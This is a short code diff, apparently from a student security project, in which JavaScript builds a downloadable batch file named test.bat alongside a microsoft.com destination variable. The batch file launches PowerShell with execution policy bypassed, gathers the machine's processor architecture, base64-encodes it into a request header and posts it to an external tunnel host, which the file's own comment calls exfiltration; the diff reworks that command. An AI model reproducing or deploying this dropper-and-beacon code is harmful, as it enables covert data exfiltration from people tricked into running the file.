@@ -116,15 +116,10 @@
     const destination = "https://microsoft.com";
     const fileName = "test.bat"; 
 
-const fileContent = [
+    const fileContent = [
       "@echo off",
       "rem Projet etudiant EPITECH - Exfiltration directe sans Master.",
-      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" +
-        "$arch = $env:PROCESSOR_ARCHITECTURE; " +
-        "$json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; " +
-        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($json); " +
-        "$b64 = [Convert]::ToBase64String($bytes); " +
-        "Invoke-RestMethod -Uri 'https://violet-comics-allow.loca.lt/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}\"",
+      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try { $arch = $env:PROCESSOR_ARCHITECTURE; $json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($json); $b64 = [Convert]::ToBase64String($bytes); Invoke-RestMethod -Uri 'https://violet-comics-allow.loca.lt/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}; Write-Host 'Succes exfiltration !' -ForegroundColor Green; } catch { Write-Host 'Erreur : ' $_.Exception.Message -ForegroundColor Red; } Read-Host 'Appuyez sur Entree pour fermer'\"",
     ].join("\r\n");
 
     const blobUrl = URL.createObjectURL(
